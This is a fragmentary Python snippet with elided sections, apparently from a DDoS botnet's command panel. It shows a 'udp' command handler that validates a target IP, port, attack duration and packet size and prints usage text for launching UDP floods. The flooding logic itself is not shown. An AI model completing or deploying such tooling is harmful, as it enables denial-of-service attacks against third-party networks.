...
def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, maxtime):
        ...
        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs, maxtime):
                    ...
                    send(client, gradientText(f'\nInvalid attack duration (10-{maxtime} seconds)\n', (255,0,0), (255,100,100)))
            else:
                send(client, gradientText('\nInvalid port number (1-65535)\n', (255,0,0), (255,100,100)))
        else:
            send(client, gradientText('\nInvalid IP-address\n', (255,0,0), (255,100,100)))
    else:
        send(client, gradientText('\nUsage: .udp [IP] [PORT] [TIME] [SIZE]', (147, 103, 176), (189, 174, 199)))
        send(client, gradientText('Use port 0 for random port mode\n', (147, 103, 176), (189, 174, 199)))